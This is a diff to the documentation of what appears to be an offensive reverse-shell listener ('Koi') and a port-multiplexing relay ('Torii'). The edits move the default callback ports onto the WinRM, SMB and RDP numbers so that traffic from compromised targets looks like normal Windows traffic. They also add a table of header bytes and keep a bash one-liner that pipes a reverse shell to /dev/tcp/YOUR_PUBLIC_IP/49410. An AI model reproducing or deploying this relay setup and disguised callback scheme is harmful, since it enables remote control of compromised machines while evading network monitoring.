@@ -10,11 +10,11 @@ Check your Koi config to see which ports:
 cat ~/.koi/config.json | grep -A 10 sidetcps
 ```
 
-By default that's ports 4011-4015, but it can be more or different depending on your config.
+By default that's `[5985, 5986, 445, 3389]`, but it can be different depending on your config. Those are WinRM, SMB and RDP ports, picked so a target dialing back looks like normal Windows traffic instead of a random high port.
 
 When you go remote or deploy on a VPS, you have a problem. You'd need to open firewall rules for:
 - Port 4010 for the reverse shell
-- Ports 4011-4015 for side-channels (or whatever your config says)
+- Ports 5985, 5986, 445 and 3389 for side-channels (or whatever your config says)
 
 Your options suck:
 - Open all those ports individually (obvious what it is)
@@ -33,7 +33,7 @@ Torii sits between your target and Koi. When a target connects, it sends a 3-byt
 [TYPE byte][PORT in big-endian]
 
 0x01 0x0F 0xAA = reverse shell to Koi:4010
-0x02 0x0F 0xAB = side-channel to Koi:4011
+0x02 0x17 0x61 = side-channel to Koi:5985
 ```
 
 When Koi needs to send a file transfer command, it tells the target to connect back. Torii intercepts that and rewrites the localhost address to your public IP, then routes it to the right internal port. The target has no idea it's being multiplexed.
@@ -53,7 +53,7 @@ If you're already pivoted inside, Koi works fine without Torii. But you could st
 Target is outside your network. Instead of opening multiple firewall holes:
 
 ```
-Without Torii: port 4010, then 4011, 4012, 4013, 4014, 4015
+Without Torii: port 4010, then 5985, 5986, 445, 3389
 With Torii:    port 49410 only
 ```
 
@@ -110,7 +110,7 @@ That's it. Targets connect to `YOUR_PUBLIC_IP:49410`, everything routes internal
 cat ~/.koi/config.json | grep -A 10 sidetcps
 ```
 
-You'll see a list like `[4011, 4012, 4013, 4014, 4015]`. You need to know these for calculating Torii headers.
+You'll see a list like `[5985, 5986, 445, 3389]`. You need to know these for calculating Torii headers.
 
 ### 2. Deploy Torii on your VPS or relay machine
 
@@ -151,13 +151,23 @@ Then wrap it with the Torii header. For a reverse shell on port 4010, the header
 
 The `printf '\x01\x0f\xaa'` sends the header bytes. After that, everything else is normal bash reverse shell. When the target connects, Torii reads those three bytes, sees it's a shell connection to port 4010, and routes to Koi.
 
-If you need a different backend port (say, 4011 for a side-channel), calculate the header:
+If you need a different backend port (say, 5985 for a side-channel), calculate the header:
 
 ```bash
-# Port 4011 in hex = 0x0F 0xAB
+# Port 5985 in hex = 0x17 0x61
 # Type 0x02 = side-channel
-(printf '\x02\x0f\xab'; your_payload_here) >& /dev/tcp/YOUR_PUBLIC_IP/49410 0>&1
+(printf '\x02\x17\x61'; your_payload_here) >& /dev/tcp/YOUR_PUBLIC_IP/49410 0>&1
 ```
+
+The other defaults, for reference:
+
+| Port | Bytes | Normally |
+|---|---|---|
+| `4010` | `0x0F 0xAA` | Koi listener (type `0x01`) |
+| `5985` | `0x17 0x61` | WinRM HTTP |
+| `5986` | `0x17 0x62` | WinRM HTTPS |
+| `445` | `0x01 0xBD` | SMB |
+| `3389` | `0x0D 0x3D` | RDP |
 
 That's all. Deploy the payload on the target, it connects through Torii, you get a session in Koi.
 
